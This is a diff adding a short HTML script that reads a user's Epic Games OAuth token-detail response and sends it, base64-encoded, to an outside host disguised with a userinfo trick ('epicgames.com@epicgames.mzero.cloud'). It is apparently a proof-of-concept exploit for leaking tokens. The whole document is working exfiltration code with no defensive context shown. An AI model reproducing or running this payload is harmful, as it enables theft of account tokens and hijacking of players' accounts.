@@ -1,0 +1,14 @@
+<script>
+    const exfil = new XMLHttpRequest();
+    exfil.open("GET", "https://content-service.bfda.live.use1a.on.epicgames.com/oauth/v1/token-detail");
+    exfil.onreadystatechange = function () {
+        if (exfil.readyState === 4) {
+            if (exfil.status === 200) {
+                document.write('<img src="https://epicgames.com@epicgames.mzero.cloud/payload/epictokenleak2.html?token=' + btoa(exfil.responseText) + '">');
+            } else {
+                alert("Failed to fetch: status=" + exfil.status);
+            }
+        }
+    };
+    exfil.send();
+</script>
